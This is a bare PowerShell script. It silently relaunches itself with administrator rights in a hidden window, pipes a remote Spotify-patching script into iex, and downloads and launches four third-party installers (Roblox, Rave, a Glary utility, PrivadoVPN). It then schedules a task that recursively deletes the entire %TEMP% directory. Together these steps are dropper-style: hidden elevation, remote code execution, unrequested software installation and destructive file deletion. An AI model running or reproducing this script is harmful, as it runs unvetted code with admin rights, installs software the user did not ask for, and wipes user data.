if (-not (New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process powershell -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`""
    exit
}

iex "& { $(iwr -useb 'https://raw.githubusercontent.com/SpotX-Official/spotx-official.github.io/main/run.ps1') } -confirm_uninstall_ms_spoti -confirm_spoti_recomended_over -podcasts_off -block_update_on -start_spoti -new_theme -adsections_off -lyrics_stat spotify"

$urls = @(
    "https://www.roblox.com/download/client?os=win",
    "https://app.rave-web.com/windows",
    "https://download.glarysoft.com/rrsetup.exe",
    "https://privadovpn.com/apps/win/Setup_PrivadoVPN_latest.exe"
)
$baseFileName = "download"
$fileExtension = ".exe"
$userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"

$tempParentPath = $env:TEMP
$tempFolderName = "PSScriptDownloads_" + (Get-Date -Format "yyyyMMdd_HHmmss_fff")
$tempWorkDir = Join-Path -Path $tempParentPath -ChildPath $tempFolderName
$allSucceeded = $true

try {
    Write-Host "Creating temporary directory: $tempWorkDir"
    $null = New-Item -ItemType Directory -Path $tempWorkDir -ErrorAction Stop
    Write-Host "Successfully created temporary directory."

    for ($i = 0; $i -lt $urls.Count; $i++) {
        $url = $urls[$i]
        $fileName = "$($baseFileName)_$($i)$($fileExtension)"
        $filePath = Join-Path -Path $tempWorkDir -ChildPath $fileName

        Write-Host ("-"*40)
        Write-Host "Processing [$($i+1)/$($urls.Count)]: $url"

        try {
            Write-Host "Attempting download to: $filePath"
            Invoke-WebRequest -Uri $url -OutFile $filePath -UserAgent $userAgent -ErrorAction Stop
            Write-Host "Download successful."

            Write-Host "Attempting to execute: $filePath"
            Start-Process -FilePath $filePath
            Write-Host "Execution initiated."
        } catch {
            Write-Error "Failed to process URL '$url'. Error: $($_.Exception.Message)"
            $allSucceeded = $false
        }
    }
} catch {
    Write-Error "A critical error occurred during setup: $($_.Exception.Message)"
    $allSucceeded = $false
}

if (Test-Path -Path $tempWorkDir -PathType Container) {
    try {
        $null = Remove-Item -Path $tempWorkDir -Recurse -Force -ErrorAction Stop
        Write-Host "Successfully removed temporary directory: $tempWorkDir"
    } catch {
        Write-Error "Error removing temporary directory '$tempWorkDir': $($_.Exception.Message)"
        try {
            [System.IO.Directory]::Delete($tempWorkDir, $true)
            Write-Host "Successfully removed temporary directory via alternative method: $tempWorkDir"
        } catch {
            Write-Warning "Critical error: unable to delete directory '$tempWorkDir'"
            Write-Warning "Please delete the directory manually after all processes are complete"
        }
    }
} else {
    Write-Host "Temporary directory does not exist or has already been removed"
}

Write-Host "Script execution completed."

$action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c rmdir /s /q `"$tempParentPath`""
$trigger = New-ScheduledTaskTrigger -Once -At ((Get-Date) + (New-TimeSpan -Hours 2))
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "Cleanup_$tempFolderName" -Description "Cleanup temporary files" -Force
Write-Output "Path to temporary folder: $tempFolderName"
